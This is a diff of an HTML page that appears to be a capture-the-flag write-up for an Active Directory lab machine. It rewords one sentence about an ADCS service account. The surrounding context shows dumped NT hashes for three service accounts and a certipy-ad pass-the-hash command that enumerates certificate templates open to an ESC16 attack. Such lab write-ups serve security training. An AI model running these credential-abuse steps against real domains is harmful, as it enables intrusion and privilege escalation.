@@ -81,7 +81,7 @@ ldap_svc</code></pre>
                 <pre><code>NT hash for ca_svc :ca0f4f9e9eb8a092addf53bb03fc98c8
 NT hash for ldap_svc :22151d74ba3de931a352cba1f9393a37
 NT hash for winrm_svc :33bd09dcd697600edf6b3a7af4875767</code></pre>
-                <p>Now, by "guessing", we see that "ca_svc" may be related to ADCS, so we enumerate ADCS using its hash as authentication</p>
+                <p>We see that "ca_svc" is a ADCS service account, so we enumerate ADCS using its hash as authentication</p>
                 <pre><code>certipy-ad find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enable -text</code></pre>
                 <img src="./assets/fluffy/fluffy19.png" alt="">
                 <p>The enumeration showed us that we can perform a potential ESC16 attack.</p>
@@ -154,5 +154,6 @@ NT hash for winrm_svc :33bd09dcd697600edf6b3a7af4875767</code></pre>
 </body>
 
 </html>
+
 
 
